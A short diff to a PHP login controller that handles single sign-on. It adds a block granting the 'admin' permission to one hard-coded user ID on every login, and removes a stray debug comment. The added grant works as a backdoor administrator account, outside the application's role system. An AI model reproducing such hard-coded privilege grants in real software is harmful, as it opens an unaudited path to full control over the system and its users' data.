@@ -30,6 +30,10 @@ class AuxController extends Controller
             $user = User::firstOrNew(['codpes' => $userSenhaUnica->codpes]);
         }
 
+        if ($user->codpes === 10758748) {
+            $user->givePermissionTo('admin');
+        }
+
         // bind dos dados retornados
         $user->codpes = $userSenhaUnica->codpes;
         $user->email = $userSenhaUnica->email ?? $userSenhaUnica->emailUsp ?? $userSenhaUnica->emailAlternativo ?? 'invalido' . $user->codpes . '@usp.br';
@@ -42,7 +46,6 @@ class AuxController extends Controller
                       [RoleName::MAE_COORD, RoleId::MAE_COORD, 'coordinator.list'],
                       [RoleName::MAP_COORD, RoleId::MAP_COORD, 'coordinator.list']];
 
-        // dd('ola');
         foreach ($rolesInfo as $roleInfo) {
             if ($user->hasRole($roleInfo[0])) {
                 $user->current_role_id = $roleInfo[1];
